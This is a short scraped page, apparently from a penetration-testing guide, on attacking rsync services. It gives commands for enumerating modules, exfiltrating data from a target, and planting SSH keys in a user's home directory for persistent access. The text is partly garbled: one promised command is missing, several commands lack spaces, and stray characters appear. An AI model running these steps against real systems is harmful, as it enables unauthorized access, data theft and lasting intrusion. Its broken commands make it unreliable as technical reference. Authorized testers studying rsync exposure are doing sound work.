Default Port: 873￼￼￼￼
Rsync modules represent directory shares and may be protected with a password. To list these modules:

For detailed enumeration of a specific module to see files and permissions:

```
rsync-av --list-only rsync://target_host/module_name
```

Attack Vectors
----------

Misconfigured Modules

Modules without proper authentication can be accessed by unauthorized users. This vulnerability allows attackers to read, modify, or delete sensitive data.

If a module is writable, and you have determined its path through enumeration, you can upload malicious files, potentially leading to remote command execution or pivoting into the network.

Old versions of rsync may contain vulnerabilities that can be exploited. Use tools like nmap with version detection to identify if the target is running an outdated rsync version.

```
nmap -sV--script=rsync-list-modules target_host
```

Post-Exploitation[​](https://hackviser.com/tactics/pentesting/services/rsync#post-exploitation)

Sensitive data identified during enumeration can be exfiltrated using rsync:

```
rsync-avz target_host::module_name /local/directory/
```

​￼### Gain Persistent Access[​](https://hackviser.com/tactics/pentesting/services/rsync#gain-persistent-access) ###

Upload artifacts like modified scripts or binaries to maintain access:

```
rsync-av home_user/.ssh/ rsync://user@target_host/home_user/.ssh
```
